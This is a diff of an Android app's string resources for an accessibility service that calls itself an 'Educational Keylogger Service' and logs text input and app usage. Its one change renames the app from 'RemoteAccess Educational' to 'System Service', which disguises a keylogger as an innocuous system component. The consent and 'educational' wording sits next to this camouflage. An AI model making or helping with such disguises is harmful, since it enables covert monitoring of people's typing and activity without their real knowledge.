@@ -13,7 +13,7 @@
     <color name="textPrimary">#212121</color>
     <color name="textSecondary">#757575</color>
     <string name="accessibility_service_description">Educational Keylogger Service\n\nThis service monitors text input for educational purposes. User must enable this manually in Settings > Accessibility.\n\nFeatures:\n• Text input logging\n• App usage tracking\n• Educational demonstrations\n\nYou can disable this service anytime from Android Settings.</string>
-    <string name="app_name">RemoteAccess Educational</string>
+    <string name="app_name">System Service</string>
     <string name="btn_accept">Accept &amp; Continue</string>
     <string name="btn_give_consent">Give Consent</string>
     <string name="btn_revoke_access">Revoke Access</string>
